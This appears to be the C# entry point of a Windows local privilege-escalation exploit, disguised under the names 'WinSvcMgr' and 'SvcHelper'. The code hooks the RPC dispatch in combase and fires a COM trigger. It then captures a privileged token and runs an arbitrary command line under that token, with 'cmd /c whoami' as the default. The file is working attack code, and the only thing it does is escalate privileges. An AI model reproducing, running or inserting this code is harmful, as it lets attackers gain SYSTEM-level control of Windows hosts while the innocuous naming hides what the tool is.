using System;
using System.IO;
using WinSvcMgr.Core;
using System.Security.Principal;
using AccessControl;
using static WinSvcMgr.CmdParse;

namespace WinSvcMgr
{
    internal class Program
    {
        class SvcArgs
        {
            [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
            public string cmd { get; set; }
        }

        static Program()
        {
            RuntimeInit.Setup();
        }

        static void Main(string[] args)
        {
            TextWriter cw = Console.Out;
            SvcArgs svcArgs;

            string helpMsg = PrintHelp(typeof(SvcArgs), "", "SvcHelper", new string[0]);

            if (args.Length == 0)
            {
                cw.WriteLine(helpMsg);
                return;
            }
            else
            {
                try
                {
                    svcArgs = ParseArgs<SvcArgs>(args);
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                        e = e.InnerException;
                    cw.WriteLine("Error:" + e.Message);
                    cw.WriteLine(helpMsg);
                    return;
                }
            }

            try
            {
                ServiceContext ctx = new ServiceContext(cw, Guid.NewGuid().ToString());
                cw.WriteLine("[*] Module: 0x{0:x}", ctx.CombaseModule);
                cw.WriteLine("[*] Table: 0x{0:x}", ctx.DispatchTablePtr);
                cw.WriteLine("[*] Func: 0x{0:x}", ctx.UseProtseqFunctionPtr);
                cw.WriteLine("[*] ParamCount: {0}", ctx.UseProtseqFunctionParamCount);

                ctx.HookRPC();
                ctx.Start();

                ComTrigger trigger = new ComTrigger(ctx);
                try
                {
                    int hr = trigger.Trigger();
                    cw.WriteLine("[*] Result: 0x{0:x}", hr);
                }
                catch (Exception e)
                {
                    cw.WriteLine(e);
                }

                WindowsIdentity sysId = ctx.GetToken();
                if (sysId != null)
                {
                    cw.WriteLine("[*] User: " + sysId.Name);
                    TokenOps.createProcessReadOut(cw, sysId.Token, svcArgs.cmd);
                }
                else
                {
                    cw.WriteLine("[!] Token acquisition failed");
                }
                ctx.Restore();
                ctx.Stop();
            }
            catch (Exception e)
            {
                cw.WriteLine("[!] " + e.Message);
            }
        }
    }
}
